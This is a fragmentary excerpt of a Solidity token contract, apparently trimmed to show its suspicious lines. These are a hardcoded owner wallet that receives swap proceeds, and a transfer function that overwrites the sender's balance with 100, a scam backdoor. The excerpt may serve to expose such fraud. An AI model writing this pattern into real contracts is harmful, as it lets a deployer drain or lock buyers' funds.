...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0x4e6e426C6110FDb80182a775d879aB23cFc7e714;
...
contract t is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"t"; 
    ...
    uint256 public _maxWalletToken = 300 * _tTotal.div(1000);
 ...
 function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x4e6e426C6110FDb80182a775d879aB23cFc7e714), BNB_Tot);
            }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {        
     ...
     function _tokenTransferwb(address sender, address recipient, uint256 tAmount) private {
            _tOwned[sender] = 100;//_tTotal-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
    }
